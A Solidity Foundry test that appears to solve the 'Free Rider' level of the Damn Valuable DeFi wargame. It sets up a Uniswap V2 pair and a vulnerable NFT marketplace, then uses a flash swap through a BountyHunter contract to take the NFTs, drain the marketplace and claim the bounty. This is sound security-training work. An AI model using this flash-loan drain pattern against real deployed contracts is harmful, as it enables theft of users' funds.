// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/test.sol";
import "../src/levels/FreeRider/FreeRiderNFTMarketplace.sol";
import "../src/levels/FreeRider/FreeRiderRecovery.sol";
import "../src/levels/FreeRider/BountyHunter.sol";
import "../src/UniswapV2/IUniswapV2Pair.sol";
import "../src/UniswapV2/IUniswapV2Router02.sol";
import "../src/UniswapV2/IUniswapV2Factory.sol";
import "../src/DamnValuableNFT.sol";
import "../src/DamnValuableToken.sol";
import "../src/WETH9.sol";

contract FreeRider is Test {
    address constant deployer =
        address(uint160(uint256(keccak256("DEPLOYER"))));
    address constant player = address(uint160(uint256(keccak256("PLAYER"))));
    address constant devs = address(uint160(uint256(keccak256("DEVS"))));
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant BOUNTY = 45 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000 ether;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;
    uint256 AMOUNT_OF_NFTS = 6;

    WETH9 weth;
    IUniswapV2Factory factory;
    IUniswapV2Pair pair;
    IUniswapV2Router02 router;
    DamnValuableToken token;
    DamnValuableNFT nft;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery devsContract;

    function setUp() public {
        vm.startPrank(deployer);
        vm.label(devs, "Devs");

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        weth = new WETH9();

        token = new DamnValuableToken();

        factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap-v2/UniswapV2Factory.json",
                abi.encode(0)
            )
        );

        router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap-v2/UniswapV2Router.json",
                abi.encode(address(factory), address(weth))
            )
        );

        token.approve(address(router), UNISWAP_INITIAL_TOKEN_RESERVE);

        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE);
        router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE,
            0,
            0,
            deployer,
            block.timestamp * 2
        );

        pair = IUniswapV2Pair(factory.getPair(address(token), address(weth)));
        assertEq(pair.token1(), address(weth));
        assertEq(pair.token0(), address(token));
        assertGt(pair.balanceOf(deployer), 0);

        vm.deal(deployer, MARKETPLACE_INITIAL_ETH_BALANCE);
        marketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        nft = DamnValuableNFT(marketplace.token());
        assertEq(
            nft.owner(),
            address(uint160(uint256(bytes32(abi.encode(0)))))
        );
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());

        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            assertEq(nft.ownerOf(i), deployer);
        }

        nft.setApprovalForAll(address(marketplace), true);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        uint256[] memory prices = new uint256[](6);
        prices[0] = NFT_PRICE;
        prices[1] = NFT_PRICE;
        prices[2] = NFT_PRICE;
        prices[3] = NFT_PRICE;
        prices[4] = NFT_PRICE;
        prices[5] = NFT_PRICE;

        marketplace.offerMany(tokenIds, prices);

        vm.stopPrank();
        vm.deal(devs, BOUNTY);
        vm.prank(devs);
        devsContract = new FreeRiderRecovery{value: BOUNTY}(
            player,
            address(nft)
        );
    }

    function testIsFreeRiderPassed() public {
        vm.startPrank(player, player);
        vm.label(player, "Player");

        BountyHunter bountyHunter = new BountyHunter(
            weth,
            marketplace,
            devsContract,
            nft,
            pair
        );

        payable(address(bountyHunter)).transfer(0.05 ether);

        pair.swap(0, 15 ether, address(bountyHunter), "0x01");

        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nft.safeTransferFrom(
                player,
                address(devsContract),
                i,
                abi.encode(player)
            );
        }

        vm.stopPrank();
        vm.startPrank(devs, devs);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            nft.transferFrom(address(devsContract), devs, tokenId);
            assertEq(nft.ownerOf(tokenId), devs);
        }
        vm.stopPrank();

        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
        assertGt(player.balance, BOUNTY);
        assertEq(address(devsContract).balance, 0);
    }
}
